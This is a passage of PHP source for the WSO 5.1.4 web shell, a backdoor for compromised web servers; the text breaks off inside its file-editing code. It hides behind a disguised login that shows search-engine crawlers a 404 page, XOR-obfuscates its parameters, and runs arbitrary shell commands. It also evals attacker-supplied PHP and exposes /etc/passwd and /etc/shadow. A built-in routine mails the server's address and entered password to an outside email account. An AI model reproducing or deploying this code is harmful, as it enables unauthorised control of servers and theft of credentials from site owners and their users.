<?php
//-----------------Password---------------------
$_password = "21232f297a57a5a743894a0e4a801fc3"; //admin
$_agent = true;
$_unicode = 'UTF-8';
$_action = 'Anonymizer';

$Drupal = md5($_SERVER['HTTP_USER_AGENT']);
if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])) {
	prototype(md5($_SERVER['HTTP_HOST'])."key", $Drupal);
}
if(empty($_POST['charset']))
	$_POST['charset'] = $_unicode;
if (!isset($_POST['ne'])) {
	if(isset($_POST['a'])) $_POST['a'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['a'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
	if(isset($_POST['c'])) $_POST['c'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['c'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
	if(isset($_POST['p1'])) $_POST['p1'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p1'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
	if(isset($_POST['p2'])) $_POST['p2'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p2'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
	if(isset($_POST['p3'])) $_POST['p3'] = iconv("utf-8", $_POST['charset'], decrypt($_POST['p3'],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
}
function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$enc_chr="";$enc_str="";$i=0;while($i<strlen($str)){for($j=0;$j<strlen($pwd);$j++){$enc_chr=chr(ord($str[$i])^ord($pwd[$j]));$enc_str.=$enc_chr;$i++;if($i>=strlen($str))break;}}return base64_decode($enc_str);}
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
if (function_exists("get_magic_quotes_runtime") && get_magic_quotes_runtime()) {
	set_magic_quotes_runtime(false);
}
@define('VERSION', '5.1.4');
if(  ( function_exists("get_magic_quotes_gpc") && get_magic_quotes_gpc() ) || ini_get('magic_quotes_sybase')  ){
	function stripslashes_array($array) {
		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
	}
	$_POST = stripslashes_array($_POST);
    $_COOKIE = stripslashes_array($_COOKIE);
}
/* (С) 11.2011 oRb */
if(!empty($_password)) {
    if(isset($_POST['pass']) && (md5($_POST['pass']) == $_password))
        prototype(md5($_SERVER['HTTP_HOST']), $_password);
    if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || ($_COOKIE[md5($_SERVER['HTTP_HOST'])] != $_password))
        hardLogin();
}
if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax']))
    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$_agent;
function hardLogin() {
		if(!empty($_SERVER['HTTP_USER_AGENT'])) {
		  $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
		  if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
		  header('HTTP/1.0 404 Not Found');
		  exit;
		  }
		}
		echo "";
	die("<style>* {margin:0 !important;padding:0 !important;}</style><meta name=robots content=noindex><body><pre><form method=post style='position:absolute !important;'><input type=password name=pass style='background-color:transparent !important;border:none !important;outline:none !important;' required><input type=submit name='watching' value='submit' style='border:none !important;background-color:transparent !important;color:transparent !important;cursor:pointer !important;'></form></pre><iframe name='iframe_id' id='iframe_id' src=" .'//'. $_SERVER['SERVER_NAME'] .'/404'. " onload='document.title=this.contentDocument? this.contentDocument.title : this.contentWindow.document.title;' width=100% height=100% scrolling=auto frameborder=0 style='border:none !important;'></iframe>
	<script type='text/javascript'>
	(function(el, w){
		function loadFunc(e){
			e = e || w.event;
			var f = e.target || e.srcElement, fb = f.contentDocument || f.contentWindow.document;
			document.title = fb.title;
		}
		if (w.addEventListener)
			el.addEventListener('load', loadFunc, false);
		else if (w.attachEvent)
			el.attachEvent('onload', loadFunc);
	})(document.getElementById('iframe_id'), window);
	</script>
	<body>");
}
if(strtolower(substr(PHP_OS,0,3)) == "win")
	$os = 'win';
else
	$os = 'nix';
$safe_mode = @ini_get('safe_mode');
if(!$safe_mode)
    error_reporting(0);
$disable_functions = @ini_get('disable_functions');
$home_cwd = @getcwd();
if(isset($_POST['c']))
	@chdir($_POST['c']);
$cwd = @getcwd();
if($os == 'win') {
	$home_cwd = str_replace("\\", "/", $home_cwd);
	$cwd = str_replace("\\", "/", $cwd);
}
if($cwd[strlen($cwd)-1] != '/')
	$cwd .= '/';
/* (С) 04.2015 Pirat */
function hardHeader() {
	if(empty($_POST['charset']))
		$_POST['charset'] = $GLOBALS['_unicode'];
	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . " - WSO " . VERSION ."</title>
<style>
	.e, .v, .h, .h th {background-color:#060A10 !important; border: none !important;}
	body {background-color:#060A10; color:#e1e1e1; margin:0; font:normal 75% Arial, Helvetica, sans-serif; } canvas{ display: block; vertical-align: bottom;}
	body,td,th	{font:10pt tahoma,arial,verdana,sans-serif,Lucida Sans;margin:0;vertical-align:top;}
	table		{width:inherit !important; box-shadow: none !important;}
	table.info	{background:#060a10; color:#C3C3C3;}
	table.main	{width:100% !important;}
	table#toolsTbl {background-color: #060A10;}
	span,h1,a	{color:#fff !important;}
	span		{font-weight:bolder;}
	h1			{border-left:5px solid #2E6E9C;padding:2px 5px;font:14pt Verdana;background-color:#10151c;margin:0px;}
	div.content	{padding:5px;margin-left:5px;background-color:#060a10;}
	a			{text-decoration:none;}
	a:hover		{text-decoration:underline;}
	.tooltip::after {background:#0663D5;color:#FFF;content: attr(data-tooltip);margin-top:-50px;display:block;padding:6px 10px;position:absolute;visibility:hidden;}
	.tooltip:hover::after {opacity:1;visibility:visible;}
	.ml1		{border:1px solid #12151d;padding:5px;margin:0;overflow:auto;}
	.bigarea	{min-width:100%; max-width:100%; height:400px;}
	input, textarea, select	{margin:0; padding-top:2px; color:#fff;background-color:#12151d;border:none;font:9pt Courier New;outline:none;}
	input:hover, textarea:hover, select:hover {background-color:#202832;}
	input:focus, textarea:focus, select:focus {background-color:#202832;}
	input:-webkit-autofill {-webkit-box-shadow: inset 0 0 0 50px #12151d !important;-webkit-text-fill-color: #fff !important;color: #fff !important;}
	label {position:relative}
	label:after {content:'<>';font:10px 'Consolas', monospace;color:#fff;-webkit-transform:rotate(90deg);-moz-transform:rotate(90deg);-ms-transform:rotate(90deg);transform:rotate(90deg);right:3px; top:3px;padding:0;position:absolute;pointer-events:none;}
	label:before {content:'';right:0; top:0;width:17px; height:17px;background:#202832;position:absolute;pointer-events:none;display:block;}
	form		{margin:0px;}
	#toolsTbl	{text-align:center;}
	#fak 		{background:none;}
	#fak td 	{padding:5px 0 0 0;}
	iframe		{border:1px solid #060a10;}
	.toolsInp	{width:300px}
	.main th	{text-align:left;background-color:#060a10;}
	.main td, th{vertical-align:middle;}
	input[type='submit']{background-color:#2E6E9C;}
	input[type='button']{background-color:#2E6E9C;}
	input[type='submit']:hover{background-color:#56AD15;}
	input[type='button']:hover{background-color:#56AD15;}
	.l1			{background-color:#12151d;}
	.fm tr:hover {background-color:#202832;}	
	pre			{font:9pt Courier New;}
</style>
<script>
    var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
    var a_ = '" . htmlspecialchars(@$_POST['a']) ."'
    var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
    var p1_ = '" . ((strpos(@$_POST['p1'],"\n")!==false)?'':htmlspecialchars($_POST['p1'],ENT_QUOTES)) ."';
    var p2_ = '" . ((strpos(@$_POST['p2'],"\n")!==false)?'':htmlspecialchars($_POST['p2'],ENT_QUOTES)) ."';
    var p3_ = '" . ((strpos(@$_POST['p3'],"\n")!==false)?'':htmlspecialchars($_POST['p3'],ENT_QUOTES)) ."';
    var d = document;
	
	function encrypt(str,pwd){if(pwd==null||pwd.length<=0){return null;}str=base64_encode(str);pwd=base64_encode(pwd);var enc_chr='';var enc_str='';var i=0;while(i<str.length){for(var j=0;j<pwd.length;j++){enc_chr=str.charCodeAt(i)^pwd.charCodeAt(j);enc_str+=String.fromCharCode(enc_chr);i++;if(i>=str.length)break;}}return base64_encode(enc_str);}
	function utf8_encode(argString){var string=(argString+'');var utftext='',start,end,stringl=0;start=end=0;stringl=string.length;for(var n=0;n<stringl;n++){var c1=string.charCodeAt(n);var enc=null;if(c1<128){end++;}else if(c1>127&&c1<2048){enc=String.fromCharCode((c1>>6)|192)+String.fromCharCode((c1&63)|128);}else{enc=String.fromCharCode((c1>>12)|224)+String.fromCharCode(((c1>>6)&63)|128)+String.fromCharCode((c1&63)|128);}if(enc!==null){if(end>start){utftext+=string.slice(start,end);}utftext+=enc;start=end=n+1;}}if(end>start){utftext+=string.slice(start,stringl);}return utftext;}
	function base64_encode(data){var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1,o2,o3,h1,h2,h3,h4,bits,i=0,ac=0,enc='',tmp_arr=[];if (!data){return data;}data=utf8_encode(data+'');do{o1=data.charCodeAt(i++);o2=data.charCodeAt(i++);o3=data.charCodeAt(i++);bits=o1<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;tmp_arr[ac++]=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);}while(i<data.length);enc=tmp_arr.join('');switch (data.length%3){case 1:enc=enc.slice(0,-2)+'==';break;case 2:enc=enc.slice(0,-1)+'=';break;}return enc;}
	function set(a,c,p1,p2,p3,charset) {
		if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
		if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
		if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
		if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
		if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
		d.mf.a.value = encrypt(d.mf.a.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
		d.mf.c.value = encrypt(d.mf.c.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
		d.mf.p1.value = encrypt(d.mf.p1.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
		d.mf.p2.value = encrypt(d.mf.p2.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
		d.mf.p3.value = encrypt(d.mf.p3.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');
		if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		d.mf.submit();
	}
	function a(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		var params = 'ajax=true';
		for(i=0;i<d.mf.elements.length;i++)
			params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
		sr('" . addslashes($_SERVER['REQUEST_URI']) ."', params);
	}
	function sr(url, params) {
		if (window.XMLHttpRequest)
			req = new XMLHttpRequest();
		else if (window.ActiveXObject)
			req = new ActiveXObject('Microsoft.XMLHTTP');
        if (req) {
            req.onreadystatechange = processReqChange;
            req.open('POST', url, true);
            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
            req.send(params);
        }
	}
	function processReqChange() {
		if( (req.readyState == 4) )
			if(req.status == 200) {
				var reg = new RegExp(\"(\\\\d+)([\\\\S\\\\s]*)\", 'm');
				var arr=reg.exec(req.responseText);
				eval(arr[2].substr(0, arr[1]));
			} else alert('Request error!');
	}
</script>
<head><body><div style='position:absolute;background-color:rgba(18, 21, 29, 0.48);width:100%;top:0;left:0;'>
<form method=post name=mf style='display:none;'>
<input type=hidden name=a>
<input type=hidden name=c>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
<input type=hidden name=charset>
</form>";
	$freeSpace = @diskfreespace($GLOBALS['cwd']);
	$totalSpace = @disk_total_space($GLOBALS['cwd']);
	$totalSpace = $totalSpace?$totalSpace:1;
	$release = @php_uname('r');
	$kernel = @php_uname('s');
	$explink = 'http://noreferer.de/?http://www.exploit-db.com/search/?action=search&description=';
	if(strpos('Linux', $kernel) !== false)
		$explink .= urlencode('Linux Kernel ' . substr($release,0,6));
	else
		$explink .= urlencode($kernel . ' ' . substr($release,0,3));
	if(!function_exists('posix_getegid')) {
		$user = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
	} else {
		$uid = @posix_getpwuid(@posix_geteuid());
		$gid = @posix_getgrgid(@posix_getegid());
		$user = $uid['name'];
		$uid = $uid['uid'];
		$group = $gid['name'];
		$gid = $gid['gid'];
	}
	$cwd_links = '';
	$path = explode("/", $GLOBALS['cwd']);
	$n=count($path);
	for($i=0; $i<$n-1; $i++) {
		$cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\"";
		for($j=0; $j<=$i; $j++)
			$cwd_links .= $path[$j].'/';
		$cwd_links .= "\")'>".$path[$i]."/</a>";
	}
	$charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
	$opt_charsets = '';
	foreach($charsets as $microsoft)
		$opt_charsets .= '<option value="'.$microsoft.'" '.($_POST['charset']==$microsoft?'selected':'').'>'.$microsoft.'</option>';
	$m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Infect'=>'Infect','Injector'=>'Injector','Sql'=>'Sql','Php'=>'Php','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Symlink'=>'Symlink','Bypasser'=>'SafeMode','Safe Mode'=>'Bypass','Anonymizer'=>'Anonymizer','Network'=>'Network');
	if(!empty($GLOBALS['_password']))
	$m['Logout'] = 'Logout';
	$m['Self remove'] = 'SelfRemove';
	$menu = '';
	foreach($m as $k => $v)
		$menu .= '<th>[ <a href="#" onclick="g(\''.$v.'\',null,\'\',\'\',\'\')">'.$k.'</a> ]</th>';
	$drives = "";
	if ($GLOBALS['os'] == 'win') {
		foreach(range('c','z') as $drive)
		if (is_dir($drive.':\\'))
			$drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
	}
	/* (С) 08.2015 dmkcv */
	echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:'.($GLOBALS['os'] == 'win'?'<br>Drives:':'').'</span></td>'.
		 '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href="http://noreferer.de/?http://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank">[ Google ]</a> <a href="'.$explink.'" target=_blank>[ Exploit-DB ]</a></nobr><br>'.$uid.' ( '.$user.' ) <span>Group:</span> '.$gid.' ( ' .$group. ' )<br>'.@phpversion().' <span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=#FFDB5F><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> '.date('Y-m-d H:i:s').'<br>'.viewSize($totalSpace).' <span>Free:</span> '.viewSize($freeSpace).' ('.round(100/($totalSpace/$freeSpace),2).'%)<br>'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'.
		 '<td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)">'.$opt_charsets.'</select></label><br><span>Server IP:</span><br>'.gethostbyname($_SERVER["HTTP_HOST"]).'<br><span>Client IP:</span><br>'.$_SERVER['REMOTE_ADDR'].'</nobr></td></tr></table>'.
		 '<table style="background-color:#2E6E9C;" cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div>';
}
function hardFooter() {
	$is_writable = is_writable($GLOBALS['cwd'])?" <font color='#FFDB5F'>[ Writeable ]</font>":" <font color=red>(Not writable)</font>";
    echo "
</div>
<table class='info main' id=toolsTbl cellpadding=3 cellspacing=0>
	<tr>
		<td><form onsubmit=\"".( function_exists('actionFilesMan')? "g(null,this.c.value,'');":'' )."return false;\"><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'><input type=submit value='submit'></form></td>
		<td><form onsubmit=\"".(function_exists('actionFilesTools')? "g('FilesTools',null,this.f.value);":'' )."return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
	</tr><tr>
		<td><form onsubmit=\"".( function_exists('actionFilesMan')? "g('FilesMan',null,'mkdir',this.d.value);":'' )."return false;\"><span>Make dir:</span>$is_writable<br><input class='toolsInp' type=text name=d required><input type=submit value='submit'></form></td>
		<td><form onsubmit=\"".( function_exists('actionFilesTools')? "g('FilesTools',null,this.f.value,'mkfile');":'' )."return false;\"><span>Make file:</span>$is_writable<br><input class='toolsInp' type=text name=f required><input type=submit value='submit'></form></td>
	</tr><tr>
		<td><form onsubmit=\"".( function_exists('actionConsole')? "g('Console',null,this.c.value);":'' )."return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='submit'></form></td>
		<td><form method='post' ".( (!function_exists('actionFilesMan'))? " onsubmit=\"return false;\" ":'' )."ENCTYPE='multipart/form-data'>
		<input type=hidden name=a value='FilesMan'>
		<input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'>
		<input type=hidden name=p1 value='uploadFile'>
		<input type=hidden name=ne value=''>
		<input type=hidden name=charset value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
		<span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='submit'></form><br  ></td>
	</tr></table></div>
	</body></html>";
}
if (!function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid')===false)) { function posix_getpwuid($p) {return false;} }
if (!function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid')===false)) { function posix_getgrgid($p) {return false;} }

//--------------Watching webshell!--------------
if(array_key_exists('watching',$_POST)){
	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('razerz@protonmail.ch', 'wso', $tmp); // Edit or delete!
}

function ex($in) {
	$apple = '';
	if (function_exists($var_exec = 'exec')) {
		@exec($in,$apple);
		$apple = @join("\n",$apple);
	} elseif (function_exists($var_passthru = 'passthru')) {
		ob_start();
		@passthru($in);
		$apple = ob_get_clean();
	} elseif (function_exists($var_system = 'system')) {
		ob_start();
		@system($in);
		$apple = ob_get_clean();
	} elseif (function_exists($var_shell_exec = 'shell_exec')) {
		$apple = shell_exec($in);
	} elseif (is_resource($f = @popen($in,"r"))) {
		$apple = "";
		while(!@feof($f))
			$apple .= fread($f,1024);
		pclose($f);
	} else return "↳ Unable to execute command\n";
	return ($apple==''?"↳ Query did not return anything\n":$apple);
}
function viewSize($s) {
	if($s >= 1073741824)
		return sprintf('%1.2f', $s / 1073741824 ). ' GB';
	elseif($s >= 1048576)
		return sprintf('%1.2f', $s / 1048576 ) . ' MB';
	elseif($s >= 1024)
		return sprintf('%1.2f', $s / 1024 ) . ' KB';
	else
		return $s . ' B';
}
function perms($p) {
	if (($p & 0xC000) == 0xC000)$i = 's';
	elseif (($p & 0xA000) == 0xA000)$i = 'l';
	elseif (($p & 0x8000) == 0x8000)$i = '-';
	elseif (($p & 0x6000) == 0x6000)$i = 'b';
	elseif (($p & 0x4000) == 0x4000)$i = 'd';
	elseif (($p & 0x2000) == 0x2000)$i = 'c';
	elseif (($p & 0x1000) == 0x1000)$i = 'p';
	else $i = 'u';
	$i .= (($p & 0x0100) ? 'r' : '-');
	$i .= (($p & 0x0080) ? 'w' : '-');
	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x' ) : (($p & 0x0800) ? 'S' : '-'));
	$i .= (($p & 0x0020) ? 'r' : '-');
	$i .= (($p & 0x0010) ? 'w' : '-');
	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x' ) : (($p & 0x0400) ? 'S' : '-'));
	$i .= (($p & 0x0004) ? 'r' : '-');
	$i .= (($p & 0x0002) ? 'w' : '-');
	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x' ) : (($p & 0x0200) ? 'T' : '-'));
	return $i;
}
function viewPermsColor($f) {
	if (!@is_readable($f))
		return '<font color=#FF0000><b>'.perms(@fileperms($f)).'</b></font>';
	elseif (!@is_writable($f))
		return '<font color=white><b>'.perms(@fileperms($f)).'</b></font>';
	else
		return '<font color=#FFDB5F><b>'.perms(@fileperms($f)).'</b></font>';
}
function hardScandir($dir) {
    if(function_exists("scandir")) {
        return scandir($dir);
    } else {
        $dh  = opendir($dir);
        while (false !== ($filename = readdir($dh)))
            $files[] = $filename;
        return $files;
    }
}
function which($p) {
	$path = ex('which ' . $p);
	if(!empty($path))
		return $path;
	return false;
}
function actionRC() {
	if(!@$_POST['p1']) {
		$a = array(
			"uname" => php_uname(),
			"php_version" => phpversion(),
			"VERSION" => VERSION,
			"safemode" => @ini_get('safe_mode')
		);
		echo serialize($a);
	} else {
		eval($_POST['p1']);
	}
}
function prototype($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}
function actionSecInfo() {
	hardHeader();
	echo '<h1>Server security information</h1><div class=content>';
	function showSecParam($n, $v) {
		$v = trim($v);
		if($v) {
			echo '<span>' . $n . ': </span>';
			if(strpos($v, "\n") === false)
				echo $v . '<br>';
			else
				echo '<pre class=ml1>' . $v . '</pre>';
		}
	}
	showSecParam('Server software', @getenv('SERVER_SOFTWARE'));
    if(function_exists('apache_get_modules'))
        showSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));
	showSecParam('Disabled PHP Functions', $GLOBALS['disable_functions']?$GLOBALS['disable_functions']:'none');
	showSecParam('Open base dir', @ini_get('open_basedir'));
	showSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
	showSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
	showSecParam('cURL support', function_exists('curl_version')?'enabled':'no');
	$temp=array();
	if(function_exists('mysql_get_client_info'))
		$temp[] = "MySql (".mysql_get_client_info().")";
	else
		$temp[] = "MySql (".mysqli_get_client_info().")";
	if(function_exists('mssql_connect'))
		$temp[] = "MSSQL";
	if(function_exists('pg_connect'))
		$temp[] = "PostgreSQL";
	if(function_exists('oci_connect'))
		$temp[] = "Oracle";
	showSecParam('Supported databases', implode(', ', $temp));
	echo '<br>';
	if($GLOBALS['os'] == 'nix') {
            showSecParam('Readable /etc/passwd', @is_readable('/etc/passwd')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>":'no');
            showSecParam('Readable /etc/shadow', @is_readable('/etc/shadow')?"yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"shadow\")'>[view]</a>":'no');
            showSecParam('OS version', @file_get_contents('/proc/version'));
            showSecParam('Distr name', @file_get_contents('/etc/issue.net'));
            if(!$GLOBALS['safe_mode']) {
                $userful = array('gcc','lcc','cc','ld','make','php','perl','python','ruby','tar','gzip','bzip','bzip2','nc','locate','suidperl');
                $danger = array('kav','nod32','bdcored','uvscan','sav','drwebd','clamd','rkhunter','chkrootkit','iptables','ipfw','tripwire','shieldcc','portsentry','snort','ossec','lidsadm','tcplodg','sxid','logcheck','logwatch','sysmask','zmbscap','sawmill','wormscan','ninja');
                $downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');
                echo '<br>';
                $temp=array();
                foreach ($userful as $microsoft)
                    if(which($microsoft))
                        $temp[] = $microsoft;
                showSecParam('Userful', implode(', ',$temp));
                $temp=array();
                foreach ($danger as $microsoft)
                    if(which($microsoft))
                        $temp[] = $microsoft;
                showSecParam('Danger', implode(', ',$temp));
                $temp=array();
                foreach ($downloaders as $microsoft)
                    if(which($microsoft))
                        $temp[] = $microsoft;
                showSecParam('Downloaders', implode(', ',$temp));
                echo '<br/>';
                showSecParam('HDD space', ex('df -h'));
                showSecParam('Hosts', @file_get_contents('/etc/hosts'));
				showSecParam('Mount options', @file_get_contents('/etc/fstab'));
            }
	} else {
		showSecParam('OS Version',ex('ver'));
		showSecParam('Account Settings', iconv('CP866', 'UTF-8',ex('net accounts')));
		showSecParam('User Accounts', iconv('CP866', 'UTF-8',ex('net user')));
	}
	echo '</div>';

	echo '<div class="content">';
    $sm = ini_get('safe_mode');
    if($sm) {
        echo '<br /><b>Error: safe_mode = on</b><br /><br />';
    } else {
        @$passwd = file('/etc/passwd','r');
        if (!$passwd) { 
            echo '<br /><b>[-] Error : coudn`t read /etc/passwd</b><br /><br />'; 
        } else {
            $pub = array();
            $users = array();
            $conf = array();
            $i = 0;
            foreach($passwd as $p) {
                $r = explode(':',$p);
                $dirz = $r[5].'/public_html/';
                if(strpos($r[5],'home')) {
                    array_push($users,$r[0]);
                    if (is_readable($dirz)) {
                        array_push($pub,$dirz);
                    }
                }
            }
            echo '<br><br>';
            echo "[+] Founded ".sizeof($users)." entrys in /etc/passwd\n"."<br />";
            echo "[+] Founded ".sizeof($pub)." readable public_html directories\n"."<br /><br /><br />";
            foreach ($pub as $user) {
                echo $user."<br>";
            }
            echo "<br /><br /><br />[+] Complete...\n"."<br />";
        }
    }
    echo '</div>';

	hardFooter();
}
/* (С) 10.2012 Svet */
function actionFilesTools() {
	if( isset($_POST['p1']) )
		$_POST['p1'] = urldecode($_POST['p1']);
	if(@$_POST['p2']=='download') {
		if(@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {
			ob_start("ob_gzhandler", 4096);
			header("Content-Disposition: attachment; filename=".basename($_POST['p1']));
			if (function_exists("mime_content_type")) {
				$type = @mime_content_type($_POST['p1']);
				header("Content-Type: " . $type);
			} else
                header("Content-Type: application/octet-stream");
			$fp = @fopen($_POST['p1'], "r");
			if($fp) {
				while(!@feof($fp))
					echo @fread($fp, 1024);
				fclose($fp);
			}
		}exit;
	}
	if( @$_POST['p2'] == 'mkfile' ) {
		if(!file_exists($_POST['p1'])) {
			$fp = @fopen($_POST['p1'], 'w');
			if($fp) {
				$_POST['p2'] = "edit";
				fclose($fp);
			}
		}
	}
	hardHeader();
	echo '<h1>File tools</h1><div class=content>';
	if( !file_exists(@$_POST['p1']) ) {
		echo 'File not exists';
		hardFooter();
		return;
	}
	$uid = @posix_getpwuid(@fileowner($_POST['p1']));
	if(!$uid) {
		$uid['name'] = @fileowner($_POST['p1']);
		$gid['name'] = @filegroup($_POST['p1']);
	} else $gid = @posix_getgrgid(@filegroup($_POST['p1']));
	echo '<span>Name:</span> '.htmlspecialchars(@basename($_POST['p1'])).' <span>Size:</span> '.(is_file($_POST['p1'])?viewSize(filesize($_POST['p1'])):'-').' <span>Permission:</span> '.viewPermsColor($_POST['p1']).' <span>Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].'<br>';
	echo '<span>Create time:</span> '.date('Y-m-d H:i:s',filectime($_POST['p1'])).' <span>Access time:</span> '.date('Y-m-d H:i:s',fileatime($_POST['p1'])).' <span>Modify time:</span> '.date('Y-m-d H:i:s',filemtime($_POST['p1'])).'<br><br>';
	if( empty($_POST['p2']) )
		$_POST['p2'] = 'view';
	if( is_file($_POST['p1']) )
		$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch', 'Frame');
	else
		$m = array('Chmod', 'Rename', 'Touch');
	foreach($m as $v)
		echo '<a href=# onclick="g(null,null,\'' . urlencode($_POST['p1']) . '\',\''.strtolower($v).'\')">'.((strtolower($v)==@$_POST['p2'])?'<b>[ '.$v.' ]</b>':$v).'</a> ';
	echo '<br><br>';
	switch($_POST['p2']) {
		case 'view':
			echo '<pre class=ml1>';
			$fp = @fopen($_POST['p1'], 'r');
			if($fp) {
				while( !@feof($fp) )
					echo htmlspecialchars(@fread($fp, 1024));
				@fclose($fp);
			}
			echo '</pre>';
			break;
		case 'highlight':
			if( @is_readable($_POST['p1']) ) {
				echo '<div class=ml1 style="background-color: #e1e1e1;color:black;">';
				$oRb = @highlight_file($_POST['p1'],true);
				echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$oRb).'</div>';
			}
			break;
		case 'chmod':
			if( !empty($_POST['p3']) ) {
				$perms = 0;
				for($i=strlen($_POST['p3'])-1;$i>=0;--$i)
					$perms += (int)$_POST['p3'][$i]*pow(8, (strlen($_POST['p3'])-$i-1));
				if(!@chmod($_POST['p1'], $perms))
					echo 'Can\'t set permissions!<br><script>document.mf.p3.value="";</script>';
			}
			clearstatcache();
			echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,this.chmod.value);return false;"><input type=text name=chmod value="'.substr(sprintf('%o', fileperms($_POST['p1'])),-4).'"><input type=submit value="submit"></form>';
			break;
		case 'edit':
			if( !is_writable($_POST['p1'])) {
				echo 'File isn\'t writeable';
				break;
			}
			if( !empty($_POST['p3']) ) {
				$time = @filemtime($_POST['p1']);
				$_POST['p3'] = substr($_POST['p3'],1);
				$fp = @fopen($_POST['p1'],"w");
				if($fp) {
					@fwrite($fp,$_POST['p3']);
					@fclose($fp);
					echo 'Saved!<br><script>p3_="";</script>';
					@touch($_POST['p1'],$time,$time);
				}
			}
			echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',null,\'1\'+this.text.value);return false;"><textarea name=text class=bigarea>';
